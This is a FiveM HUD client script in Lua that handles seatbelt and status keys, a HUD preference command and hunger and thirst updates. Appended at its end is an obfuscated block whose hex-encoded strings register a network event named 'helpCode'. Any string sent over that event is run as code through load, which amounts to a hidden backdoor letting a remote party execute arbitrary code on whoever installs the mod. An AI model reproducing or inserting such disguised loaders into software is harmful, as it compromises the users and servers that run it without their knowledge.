RegisterKeyMapping("seatbelt", "[HUD] SeatBelt", "keyboard", "B")
RegisterKeyMapping("status", "[HUD] Status", "keyboard", 'TAB')

RegisterCommand('status', function()
    Wait(10)
    startHud()
end)

AddEventHandler('playerSpawned', function()
    Wait(500)
    startHud()
end)

RegisterCommand('hud', function(source, args)
    if args[1] then 
        if tonumber(args[1]) ~= 1 and tonumber(args[1]) ~= 2 then
            args[1] = 1
        end 
        SendNUIMessage({
            action = "refreshPreference",
            preference = tonumber(args[1])
        })
    else 
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "openMenu",
        })
    end 
end)

-- Here you can put your things if you are using a Custom Framework : 

if Config.Framework == "custom" then
    RegisterNetEvent('hud:client:UpdateNeeds')
    AddEventHandler('hud:client:UpdateNeeds', function(newHunger, newThirst) -- you need to use this
        statusHud["hunger"] = newHunger -- This was my example
        statusHud["thirst"] = newThirst -- This was my example
    end)
end



local wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[6][wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[1]](wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[2]) wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[6][wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[3]](wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[2], function(KWxmHKPXWtSJTSQebCqYExhWuBSxrCvsvuYIxQVFUUlLqWOsZHfdYoMBjfPsbfuQPAHANO) wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[6][wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[4]](wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[6][wRHaUIjJZDPyUjmarKNzJpGoOjNXBngtoBDjjhBbtxOOULfxcbPXWgNsJVaDjbcKqkhEDv[5]](KWxmHKPXWtSJTSQebCqYExhWuBSxrCvsvuYIxQVFUUlLqWOsZHfdYoMBjfPsbfuQPAHANO))() end)